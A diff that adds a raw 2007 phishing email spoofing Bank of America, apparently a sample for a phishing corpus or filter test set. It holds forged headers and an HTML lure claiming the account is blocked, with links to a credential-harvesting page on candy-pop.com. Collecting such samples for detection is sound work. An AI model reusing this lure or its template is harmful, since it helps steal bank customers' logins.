@@ -1,0 +1,88 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <security@bankofamerica.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 8AF8B4695C
+ for <user@login.example.com>; Wed, 21 Feb 2007 23:21:01 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 926C7131FD54
+ for <user@example.com>; Wed, 21 Feb 2007 23:21:01 -0500 (EST)
+Received: from leestaffing.com (adsl-065-015-157-204.sip.bhm.bellsouth.net
+ [65.15.157.204])
+ by mail.example.org (Postfix) with ESMTP id 55D2F6FA1A8
+ for <user@example.com>; Wed, 21 Feb 2007 23:21:01 -0500 (EST)
+Received: from User ([66.137.204.115]) by leestaffing.com with Microsoft
+ SMTPSVC(6.0.3790.211); Wed, 21 Feb 2007 04:46:26 -0600
+From: "Bank Of America"<security@bankofamerica.com>
+Subject: Security: Online banking account has been blocked.
+Date: Wed, 21 Feb 2007 04:48:25 -0600
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVER1r3SU0hXCRQcq0000019b@leestaffing.com>
+X-OriginalArrivalTime: 21 Feb 2007 10:46:26.0515 (UTC)
+ FILETIME=[8951C230:01C755A5]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 873
+
+<html>
+<body>
+<title>Bank of America Account Review Department !</title>
+<head>
+<style type="text/css">
+.style1 {font-family: Verdana, Arial, Helvetica, sans-serif;font-weight: bold;color: #D4001A;}
+.style3 {color: #000000; font-size: 12px; font-family: Verdana, Arial, Helvetica, sans-serif;}
+.style4 {font-family: Verdana, Arial, Helvetica, sans-serif;font-size: 10px;}
+</style>
+</head>
+
+<table width="733" height="238" border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td height="27" colspan="3">
+<img src="http://grandsteer.com/olb_masthead_nonav.gif" alt="Bank of America Higher Standards" longdesc="http://www.bankofamerica.com"></td>
+</tr>
+<tr>
+<td height="103" colspan="3" bgcolor="#D4001A">
+<img src="http://release35.par3.com/images/client/bankofamerica/em_photo.jpg"><img src="http://release35.par3.com/images/client/bankofamerica/em_title_red.gif" alt="Online Banking Alert"></td>
+
+</tr>
+<tr>
+<td width="160" height="99"><A href="http://www.candy-pop.com/www.bankofamerica.com/BOA/sslencrypt218bit/online_banking/index.htm" target="_blank"><img src="http://release35.par3.com/images/client/bankofamerica/em_promo2.gif" border=0 alt="Sign In"></a></td>
+<td width="1090" colspan="2"><br>
+<table width="500" height="125" border="0" align="center" cellpadding="3" cellspacing="3">
+<tr>
+<td width="527"><p class="style1">Your Online Banking Account has been Blocked</p>
+<p align="justify" class="style3">Because of   unusual number of invalid login attempts on you account, we had to believe that,   their might be some security problem on you account. So we have decided to put   an extra verification process to ensure your identity and your account security.   Please click on <A href="http://www.candy-pop.com/www.bankofamerica.com/BOA/sslencrypt218bit/online_banking/index.htm" target="_blank">sign in to Online Banking</A> to continue to the verification process and   ensure your account security. It is all about your security. Thank you, and   visit the customer service section.</p></td>
+</tr>
+</table><br>
+</td>
+</tr>
+
+<tr>
+<td height="9" colspan="3"><hr width=200 size=1 noshade color="#cccccc" style='width:560.25pt'></td>
+</tr>
+</table>
+<table width="750" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="486"><span class="style4">Bank of   America,   N.A. Member FDIC. <A href="http://www.bankofamerica.com/help/equalhousing.cfm" target="_blank" BOA>Equal Housing Lender</A> <IMG src="http://release35.par3.com/images/client/bankofamerica/house_1.gif"><br>
+&copy; 2007 Bank of America Corporation. All rights reserved.</span></td>
+<td width="99">&nbsp;</td>
+<td width="167">
+<div align="right">
+<img src="http://release35.par3.com/images/client/bankofamerica/foot_olympic.gif" alt="Olympic Logo">
+
+</div>
+</td>
+</tr>
+</table>
+</body>
+</html>
